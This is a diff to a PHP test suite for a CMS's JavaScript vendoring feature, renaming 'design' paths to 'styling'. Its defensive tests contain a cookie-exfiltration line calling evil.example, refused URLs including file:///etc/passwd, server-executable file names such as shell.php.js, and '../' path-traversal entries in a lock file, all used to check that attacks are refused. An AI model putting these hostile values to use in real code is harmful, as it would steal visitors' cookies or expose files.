@@ -7,15 +7,15 @@ namespace Cms\Modules\Site\Tests;
 use Cms\Abilities\AbilityContext;
 use Cms\Abilities\AbilityException;
 use Cms\Modules\Site\Build\SiteBuilder;
-use Cms\Modules\Site\Design\Code;
-use Cms\Modules\Site\Design\Vendor;
-use Cms\Modules\Site\Design\VendorFetcher;
+use Cms\Modules\Site\Styling\Code;
+use Cms\Modules\Site\Styling\Vendor;
+use Cms\Modules\Site\Styling\VendorFetcher;
 use Cms\Modules\Site\Rendering\Renderer;
 use Cms\Support\Files;
 use Cms\Tests\TestCase;
 use Illuminate\Support\Facades\Artisan;
 
-/** Libraries in content/design/vendor: fetched once, locked, and imported by name through the import map. */
+/** Libraries in content/styling/vendor: fetched once, locked, and imported by name through the import map. */
 final class VendorTest extends TestCase
 {
     private FakeVendorFetcher $cdn;
@@ -60,7 +60,7 @@ final class VendorTest extends TestCase
 
     private function lock(): array
     {
-        return Files::readJson(content_path('design/vendor/lock.json'))['imports'] ?? [];
+        return Files::readJson(content_path('styling/vendor/lock.json'))['imports'] ?? [];
     }
 
     public function test_add_keeps_the_build_and_locks_its_version_and_hash(): void
@@ -68,7 +68,7 @@ final class VendorTest extends TestCase
         $result = $this->vendor()->add('gsap@3.12.5');
 
         $this->assertSame(['gsap'], $result['added']);
-        $file = content_path('design/vendor/gsap@3.12.5/index.js');
+        $file = content_path('styling/vendor/gsap@3.12.5/index.js');
         $this->assertSame("/** Bundled by jsDelivr */\nconst gsap={to(){}};export{gsap as default};\n", file_get_contents($file), 'without the source map it can’t have');
         $lock = $this->lock()['gsap'];
         $this->assertSame('3.12.5', $lock['version']);
@@ -97,7 +97,7 @@ final class VendorTest extends TestCase
         }
 
         $this->assertSame([], $this->cdn->asked);
-        $this->assertDirectoryDoesNotExist(content_path('design/vendor'));
+        $this->assertDirectoryDoesNotExist(content_path('styling/vendor'));
     }
 
     public function test_what_a_build_imports_from_the_cdn_is_kept_too_and_a_package_is_shared_by_name(): void
@@ -105,12 +105,12 @@ final class VendorTest extends TestCase
         $result = $this->vendor()->add('three@0.160.0', 'examples/jsm/controls/OrbitControls.js', 'three/addons/controls/OrbitControls.js');
 
         $this->assertSame(['three/addons/controls/OrbitControls.js', 'three'], $result['added']);
-        $controls = (string) file_get_contents(content_path('design/vendor/three@0.160.0/examples/jsm/controls/OrbitControls.js'));
+        $controls = (string) file_get_contents(content_path('styling/vendor/three@0.160.0/examples/jsm/controls/OrbitControls.js'));
         $this->assertStringContainsString('from"three"', $controls, 'the package by its name: one copy for everything that imports it');
         $this->assertStringContainsString('from"../../../../three@0.160.0/examples/jsm/helper.js"', $controls, 'a file of it by its place');
         $this->assertStringNotContainsString('/npm/', $controls);
-        $this->assertFileExists(content_path('design/vendor/three@0.160.0/examples/jsm/helper.js'));
-        $this->assertFileExists(content_path('design/vendor/three@0.160.0/index.js'));
+        $this->assertFileExists(content_path('styling/vendor/three@0.160.0/examples/jsm/helper.js'));
+        $this->assertFileExists(content_path('styling/vendor/three@0.160.0/index.js'));
         $this->assertSame(['three'], $this->lock()['three/addons/controls/OrbitControls.js']['requires']);
 
         try {
@@ -121,10 +121,10 @@ final class VendorTest extends TestCase
         }
 
         $this->vendor()->remove('three/addons/controls/OrbitControls.js');
-        $this->assertFileDoesNotExist(content_path('design/vendor/three@0.160.0/examples/jsm/helper.js'));
-        $this->assertFileExists(content_path('design/vendor/three@0.160.0/index.js'));
+        $this->assertFileDoesNotExist(content_path('styling/vendor/three@0.160.0/examples/jsm/helper.js'));
+        $this->assertFileExists(content_path('styling/vendor/three@0.160.0/index.js'));
         $this->vendor()->remove('three');
-        $this->assertDirectoryDoesNotExist(content_path('design/vendor'));
+        $this->assertDirectoryDoesNotExist(content_path('styling/vendor'));
     }
 
     public function test_a_build_that_loads_from_another_server_or_is_no_script_is_refused(): void
@@ -139,7 +139,7 @@ final class VendorTest extends TestCase
         }
 
         $this->assertSame([], $this->vendor()->all());
-        $this->assertDirectoryDoesNotExist(content_path('design/vendor'), 'nothing of a refused build is kept');
+        $this->assertDirectoryDoesNotExist(content_path('styling/vendor'), 'nothing of a refused build is kept');
     }
 
     public function test_files_are_kept_as_js_and_never_under_a_name_a_server_runs(): void
@@ -147,8 +147,8 @@ final class VendorTest extends TestCase
         $this->vendor()->add('lenis@1.1.13', 'dist/lenis.mjs', 'lenis');
 
         $this->assertSame('lenis@1.1.13/dist/lenis.js', $this->vendor()->all()['lenis']['path']);
-        $this->assertFileExists(content_path('design/vendor/lenis@1.1.13/dist/lenis.js'));
-        $this->assertStringNotContainsString('sourceMappingURL', (string) file_get_contents(content_path('design/vendor/lenis@1.1.13/dist/lenis.js')));
+        $this->assertFileExists(content_path('styling/vendor/lenis@1.1.13/dist/lenis.js'));
+        $this->assertStringNotContainsString('sourceMappingURL', (string) file_get_contents(content_path('styling/vendor/lenis@1.1.13/dist/lenis.js')));
         $this->assertSame('/_cms/site/vendor/lenis@1.1.13/dist/lenis.js', $this->vendor()->map()['imports']['lenis']);
 
         foreach ([['x@1.0.0', 'dist/shell.php.js', null], ['x@1.0.0', 'a.phtml/b.js', null], ['x.php@1.0.0', null, null], ['x@1.0.0', null, 'x/y.php.js']] as [$spec, $file, $as]) {
@@ -163,7 +163,7 @@ final class VendorTest extends TestCase
 
     public function test_the_fetcher_asks_only_the_cdn_and_the_registry(): void
     {
-        $fetcher = new \Cms\Modules\Site\Design\HttpVendorFetcher;
+        $fetcher = new \Cms\Modules\Site\Styling\HttpVendorFetcher;
 
         // Refused before anything is sent.
         foreach (['https://evil.example/npm/gsap@3.12.5/+esm', 'http://cdn.jsdelivr.net/npm/gsap@3.12.5/+esm', 'https://cdn.jsdelivr.net.evil.example/x', 'file:///etc/passwd'] as $url) {
@@ -184,9 +184,9 @@ final class VendorTest extends TestCase
         $this->assertFileExists(public_path('_cms/site/vendor/gsap@3.12.5/index.js'));
 
         $this->assertSame('3.13.0', $this->vendor()->update('gsap')['version']);
-        $this->assertFileDoesNotExist(content_path('design/vendor/gsap@3.12.5/index.js'));
+        $this->assertFileDoesNotExist(content_path('styling/vendor/gsap@3.12.5/index.js'));
         $this->assertFileDoesNotExist(public_path('_cms/site/vendor/gsap@3.12.5/index.js'), 'the published copy goes with it');
-        $this->assertFileExists(content_path('design/vendor/gsap@3.13.0/index.js'));
+        $this->assertFileExists(content_path('styling/vendor/gsap@3.13.0/index.js'));
 
         $this->assertSame('3.12.5', $this->vendor()->update('gsap', '3.12.5')['version']);
         $this->assertSame(['gsap'], array_keys($this->vendor()->all()));
@@ -200,7 +200,7 @@ final class VendorTest extends TestCase
     {
         $this->vendor()->add('gsap@3.12.5');
         $this->vendor()->add('@scope/site@1.0.0');
-        Files::put(content_path('design/scripts/hero.js'), "import gsap from 'gsap'\n");
+        Files::put(content_path('styling/scripts/hero.js'), "import gsap from 'gsap'\n");
         $this->app->make(Code::class)->flush();
         $render = fn (array $blocks, string $title) => $this->app->make(Renderer::class)->entry($this->cms()->entries()->find($this->cms()->entryService()->create('pages', ['title' => $title, 'status' => 'published', 'data' => ['content' => $blocks]])->id))['html'];
 
@@ -212,7 +212,7 @@ final class VendorTest extends TestCase
         $this->assertSame('/_cms/site/vendor/gsap@3.12.5/index.js', $map['imports']['gsap']);
         $this->assertSame('/_cms/site/vendor/@scope/site@1.0.0/index.js', $map['imports']['@scope/site']);
         $this->assertSame($this->lock()['gsap']['files']['gsap@3.12.5/index.js'], $map['integrity']['/_cms/site/vendor/gsap@3.12.5/index.js']);
-        $this->assertFileEquals(content_path('design/vendor/gsap@3.12.5/index.js'), public_path('_cms/site/vendor/gsap@3.12.5/index.js'));
+        $this->assertFileEquals(content_path('styling/vendor/gsap@3.12.5/index.js'), public_path('_cms/site/vendor/gsap@3.12.5/index.js'));
         $this->assertStringNotContainsString('jsdelivr', $html);
         $this->assertStringNotContainsString('http', $m[1]);
     }
@@ -223,8 +223,8 @@ final class VendorTest extends TestCase
         $this->assertArrayHasKey('gsap', $this->vendor()->map()['imports']);
 
         $this->travel(5)->seconds();
-        file_put_contents(content_path('design/vendor/gsap@3.12.5/index.js'), "fetch('https://evil.example/'+document.cookie)\n");
-        touch(content_path('design/vendor/gsap@3.12.5/index.js'), time() + 60);
+        file_put_contents(content_path('styling/vendor/gsap@3.12.5/index.js'), "fetch('https://evil.example/'+document.cookie)\n");
+        touch(content_path('styling/vendor/gsap@3.12.5/index.js'), time() + 60);
         clearstatcache();
         $this->vendor()->flush();
 
@@ -240,8 +240,8 @@ final class VendorTest extends TestCase
 
     public function test_a_lock_somebody_edited_can_not_name_files_outside(): void
     {
-        Files::put(content_path('design/secret.js'), 'secret');
-        Files::putJson(content_path('design/vendor/lock.json'), ['imports' => [
+        Files::put(content_path('styling/secret.js'), 'secret');
+        Files::putJson(content_path('styling/vendor/lock.json'), ['imports' => [
             'x' => ['package' => 'x', 'version' => '1.0.0', 'files' => ['x@1.0.0/index.js' => Vendor::hash('a'), '../secret.js' => Vendor::hash('secret')]],
             '../y' => ['package' => 'y', 'version' => '1.0.0', 'files' => ['y@1.0.0/index.js' => Vendor::hash('a')]],
             'z' => ['package' => '../z', 'version' => '1.0.0', 'files' => []],
@@ -253,7 +253,7 @@ final class VendorTest extends TestCase
 
     public function test_adding_a_library_rebuilds_the_pages_with_an_import_map(): void
     {
-        Files::put(content_path('design/scripts/hero.js'), "console.log(1)\n");
+        Files::put(content_path('styling/scripts/hero.js'), "console.log(1)\n");
         $this->cms()->entryService()->create('pages', ['title' => 'With', 'status' => 'published', 'data' => ['content' => [['type' => 'box', 'code' => ['scripts' => ['hero']], 'children' => []]]]]);
         $this->cms()->entryService()->create('pages', ['title' => 'Without', 'status' => 'published', 'data' => ['content' => [['type' => 'paragraph', 'props' => ['text' => 'Hello']]]]]);
         $builder = $this->app->make(SiteBuilder::class);
@@ -263,7 +263,7 @@ final class VendorTest extends TestCase
         [$with, $without] = [$built('/with'), $built('/without')];
 
         $this->travel(5)->seconds();
-        $this->cms()->abilities()->execute('design-vendor/create', ['package' => 'gsap@3.12.5'], AbilityContext::system('test'));
+        $this->cms()->abilities()->execute('styling-vendor/create', ['package' => 'gsap@3.12.5'], AbilityContext::system('test'));
         clearstatcache();
 
         $this->assertTrue($builder->hasWork());
@@ -309,19 +309,19 @@ final class VendorTest extends TestCase
 
         $abilities = $this->cms()->abilities();
         $context = AbilityContext::system('test');
-        $added = $abilities->execute('design-vendor/create', ['package' => 'three@0.160.0', 'file' => 'examples/jsm/controls/OrbitControls.js', 'as' => 'three/addons/controls/OrbitControls.js'], $context);
+        $added = $abilities->execute('styling-vendor/create', ['package' => 'three@0.160.0', 'file' => 'examples/jsm/controls/OrbitControls.js', 'as' => 'three/addons/controls/OrbitControls.js'], $context);
         $this->assertSame(['three', 'three/addons/controls/OrbitControls.js'], array_column($added['imports'], 'import'));
-        $this->assertSame($added['imports'], $abilities->execute('design-vendor/list', [], $context)['imports']);
-        $this->assertSame(['three'], array_column($abilities->execute('design-vendor/delete', ['import' => 'three/addons/controls/OrbitControls.js'], $context)['imports'], 'import'));
+        $this->assertSame($added['imports'], $abilities->execute('styling-vendor/list', [], $context)['imports']);
+        $this->assertSame(['three'], array_column($abilities->execute('styling-vendor/delete', ['import' => 'three/addons/controls/OrbitControls.js'], $context)['imports'], 'import'));
 
         try {
-            $abilities->execute('design-vendor/create', ['package' => 'gsap@latest'], $context);
+            $abilities->execute('styling-vendor/create', ['package' => 'gsap@latest'], $context);
             $this->fail('a range was added');
         } catch (AbilityException $e) {
             $this->assertStringContainsString('exact version', $e->getMessage());
         }
 
         $this->expectException(AbilityException::class);
-        $abilities->execute('design-vendor/create', ['package' => 'gsap@3.12.5'], AbilityContext::forUser($this->userWithRole('editor')));
+        $abilities->execute('styling-vendor/create', ['package' => 'gsap@3.12.5'], AbilityContext::forUser($this->userWithRole('editor')));
     }
 }
